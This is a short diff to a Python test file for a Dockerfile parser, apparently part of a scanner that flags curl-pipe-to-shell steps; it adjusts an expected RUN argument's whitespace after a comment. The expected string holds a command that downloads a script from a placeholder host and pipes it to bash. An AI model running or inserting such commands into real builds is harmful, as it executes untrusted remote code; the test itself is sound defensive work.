@@ -87,7 +87,8 @@ def test_comment_inside_line_continuation_keeps_the_command_whole(tmp_path):
     parsed = parse_dockerfile(path)
 
     assert [inst["instruction"] for inst in parsed] == ["FROM", "RUN"]
-    assert parsed[1]["args"] == "apk add curl && curl -sSL https://x.example/i.sh | bash"
+    # BuildKit skips the comment but preserves indentation of the next line.
+    assert parsed[1]["args"] == "apk add curl     && curl -sSL https://x.example/i.sh | bash"
 
 
 def test_curl_pipe_shell_after_a_comment_line_is_detected(tmp_path):
